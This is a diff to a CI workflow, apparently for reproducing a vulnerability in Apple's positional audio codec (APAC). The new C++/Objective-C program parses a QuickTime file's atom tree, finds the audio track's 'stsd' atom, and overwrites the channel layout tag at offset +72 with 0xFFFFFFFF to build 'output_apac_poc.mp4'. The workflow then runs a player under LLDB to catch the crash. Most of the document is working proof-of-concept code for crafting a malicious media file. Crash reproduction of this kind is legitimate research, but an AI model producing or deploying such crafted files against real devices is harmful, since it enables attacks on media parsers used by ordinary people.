@@ -61,38 +61,132 @@ jobs:
           }
           EOF
 
-      # This script is a simple utility to corrupt a file at a specific offset.
-      - name: Create C++ File Corruptor
+      # This script is now an intelligent, self-contained parser and corruptor.
+      - name: Create C++ Parser and Corruptor
         working-directory: AppleTest2/apple-positional-audio-codec-invalid-header-main
         run: |
-          echo "Creating simple C++ file corruption utility..."
+          echo "Creating intelligent C++ file parser and corruption utility..."
           cat > corruptor.cpp << 'EOF'
+          #import <Foundation/Foundation.h>
           #include <stdio.h>
-          #include <stdlib.h>
+          #include <string.h>
+          #include <sys/types.h>
+
+          // Helper to read a 32-bit big-endian integer
+          uint32_t read_uint32_be(FILE *f) {
+              unsigned char bytes[4];
+              if (fread(bytes, 1, 4, f) != 4) return 0;
+              return ((uint32_t)bytes[0] << 24) | ((uint32_t)bytes[1] << 16) | ((uint32_t)bytes[2] << 8) | bytes[3];
+          }
+
+          // Helper to compare four-character atom names
+          bool compare_fourcc(const char* a, const char* b) {
+              return strncmp(a, b, 4) == 0;
+          }
+          
+          // Function to find the offset of a direct child atom within a parent container
+          long find_child_atom(FILE* f, const char* target_name, long parent_end_offset) {
+              while (ftell(f) < parent_end_offset) {
+                  long atom_start = ftell(f);
+                  uint32_t atom_size = read_uint32_be(f);
+                  if (atom_size == 0) return -1;
+                  char atom_name[5] = {0};
+                  if (fread(atom_name, 1, 4, f) != 4) return -1;
+
+                  if (compare_fourcc(atom_name, target_name)) {
+                      return atom_start;
+                  }
+                  fseek(f, atom_start + atom_size, SEEK_SET);
+              }
+              return -1;
+          }
 
           int main(int argc, const char * argv[]) {
-              if (argc != 3) {
-                  fprintf(stderr, "Usage: %s <file_to_corrupt> <offset_to_corrupt>\n", argv[0]);
-                  return 1;
+              @autoreleasepool {
+                  const char* baseName = "IMG_1047.mov";
+                  const char* pocName = "output_apac_poc.mp4";
+
+                  if (![[NSFileManager defaultManager] copyItemAtPath:[NSString stringWithUTF8String:baseName] toPath:[NSString stringWithUTF8String:pocName] error:nil]) {
+                      fprintf(stderr, "Failed to copy base file.\n"); return 1;
+                  }
+                  fprintf(stderr, "Successfully copied base file.\n");
+
+                  FILE *file = fopen(pocName, "r+b");
+                  if (!file) {
+                      fprintf(stderr, "Failed to re-open file for corruption.\n"); return 1;
+                  }
+                  
+                  // Find the 'moov' atom
+                  fseek(file, 0, SEEK_END);
+                  long file_size = ftell(file);
+                  fseek(file, 0, SEEK_SET);
+                  long moov_offset = find_child_atom(file, "moov", file_size);
+                  if (moov_offset == -1) { fprintf(stderr, "Could not find 'moov' atom.\n"); fclose(file); return 1; }
+
+                  fseek(file, moov_offset, SEEK_SET);
+                  uint32_t moov_size = read_uint32_be(file);
+                  
+                  // Iterate through tracks inside 'moov'
+                  long trak_search_start = moov_offset + 8;
+                  long stsd_offset = -1;
+                  while(1) {
+                      fseek(file, trak_search_start, SEEK_SET);
+                      long trak_offset = find_child_atom(file, "trak", moov_offset + moov_size);
+                      if (trak_offset == -1) break;
+
+                      fseek(file, trak_offset, SEEK_SET);
+                      uint32_t trak_size = read_uint32_be(file);
+                      
+                      fseek(file, trak_offset + 8, SEEK_SET);
+                      long mdia_offset = find_child_atom(file, "mdia", trak_offset + trak_size);
+                      if (mdia_offset == -1) { trak_search_start = trak_offset + trak_size; continue; }
+                      
+                      fseek(file, mdia_offset, SEEK_SET);
+                      uint32_t mdia_size = read_uint32_be(file);
+                      
+                      fseek(file, mdia_offset + 8, SEEK_SET);
+                      long hdlr_offset = find_child_atom(file, "hdlr", mdia_offset + mdia_size);
+                      if (hdlr_offset == -1) { trak_search_start = trak_offset + trak_size; continue; }
+
+                      fseek(file, hdlr_offset + 16, SEEK_SET);
+                      char handler_type[5] = {0};
+                      fread(handler_type, 1, 4, file);
+
+                      if (compare_fourcc(handler_type, "soun")) {
+                          // This is the audio track. Find its stsd.
+                          fseek(file, mdia_offset + 8, SEEK_SET);
+                          long minf_offset = find_child_atom(file, "minf", mdia_offset + mdia_size);
+                          fseek(file, minf_offset, SEEK_SET);
+                          uint32_t minf_size = read_uint32_be(file);
+
+                          fseek(file, minf_offset + 8, SEEK_SET);
+                          long stbl_offset = find_child_atom(file, "stbl", minf_offset + minf_size);
+                          fseek(file, stbl_offset, SEEK_SET);
+                          uint32_t stbl_size = read_uint32_be(file);
+
+                          fseek(file, stbl_offset + 8, SEEK_SET);
+                          stsd_offset = find_child_atom(file, "stsd", stbl_offset + stbl_size);
+                          break; // Found it
+                      }
+                      trak_search_start = trak_offset + trak_size;
+                  }
+
+                  if (stsd_offset == -1) {
+                      fprintf(stderr, "Could not find the audio track's 'stsd' atom.\n");
+                      fclose(file); return 1;
+                  }
+                  
+                  fprintf(stderr, "Found audio 'stsd' atom at offset: 0x%lx\n", stsd_offset);
+
+                  // Corrupt the channel layout tag. The offset is relative to the start of the stsd atom.
+                  long corruption_offset = stsd_offset + 72;
+                  fseek(file, corruption_offset, SEEK_SET);
+                  unsigned char malicious_tag[4] = {0xFF, 0xFF, 0xFF, 0xFF};
+                  fwrite(malicious_tag, 1, sizeof(malicious_tag), file);
+                  
+                  fclose(file);
+                  fprintf(stderr, "Corruption complete.\n");
               }
-
-              const char* filePath = argv[1];
-              long offset = atol(argv[2]);
-
-              FILE *file = fopen(filePath, "r+b");
-              if (!file) {
-                  fprintf(stderr, "Corruptor error: Failed to open file: %s\n", filePath);
-                  return 1;
-              }
-
-              fseek(file, offset, SEEK_SET);
-              
-              // This is the specific malicious data for the channel layout tag
-              unsigned char malicious_tag[4] = {0xFF, 0xFF, 0xFF, 0xFF};
-              fwrite(malicious_tag, 1, sizeof(malicious_tag), file);
-              fclose(file);
-              
-              fprintf(stderr, "Corruption complete at offset 0x%lx.\n", offset);
               return 0;
           }
           EOF
@@ -103,7 +197,7 @@ jobs:
         with:
           xcode-version: '15.4'
 
-      # Compile the Swift and C++ utilities
+      # Compile the C++ utility
       - name: Compile Custom Tools
         working-directory: AppleTest2/apple-positional-audio-codec-invalid-header-main
         run: |
@@ -114,44 +208,13 @@ jobs:
           clang++ -g corruptor.cpp -o corruptor
           if [ ! -f ./corruptor ]; then echo "C++ corruptor compilation failed."; exit 1; fi
 
-      # This is the main step that finds the correct offset and corrupts the original file.
-      - name: Extract and Surgically Corrupt APAC Track
+      # Run the new C++ utility to parse and corrupt the file.
+      - name: Surgically Corrupt APAC File
         working-directory: AppleTest2/apple-positional-audio-codec-invalid-header-main
         run: |
-          set -x 
-          
-          echo "Installing Bento4 and jq to find the correct atom offset..."
-          brew install bento4 jq
-          
-          # Use the new video file
-          BASE_FILE="IMG_1047.mov"
-          POC_FILE="output_apac_poc.mp4"
-
-          # Create a copy to corrupt
-          cp "$BASE_FILE" "$POC_FILE"
-
-          # Step 1: Use mp4dump to create a JSON representation of the file structure.
-          mp4dump --format json "$POC_FILE" > atom_dump.json
-          
-          # Step 2: Use a robust jq query to find the 'stsd' atom containing the 'apac' codec definition.
-          OFFSET=$(jq -r '.. | objects | select(.name? == "stsd" and any(.children[]; .name? == "apac")) | .file_offset' atom_dump.json)
-
-          if [ -z "$OFFSET" ] || [ "$OFFSET" == "null" ]; then
-            echo "Could not find audio 'stsd' offset using jq. Please check atom_dump.json artifact."
-            exit 1
-          fi
-          
-          echo "Found APAC 'stsd' atom at offset ${OFFSET}"
-          
-          # The channel layout tag is at a known position within the stsd atom.
-          CORRUPTION_OFFSET=$(( ${OFFSET} + 72 ))
-          
-          echo "Calculated corruption offset: ${CORRUPTION_OFFSET}"
-
-          ./corruptor "$POC_FILE" $CORRUPTION_OFFSET
-          
+          ./corruptor
           echo "Malicious APAC PoC file generated."
-          ls -l "$POC_FILE"
+          ls -l output_apac_poc.mp4
           
       # Launch our custom player under LLDB to catch any crash.
       - name: Launch Player Under LLDB to Catch Crash
@@ -185,5 +248,4 @@ jobs:
           path: |
             AppleTest2/apple-positional-audio-codec-invalid-header-main/output_apac_poc.mp4
             AppleTest2/apple-positional-audio-codec-invalid-header-main/player_debug_log.txt
-            AppleTest2/apple-positional-audio-codec-invalid-header-main/atom_dump.json
           retention-days: 7
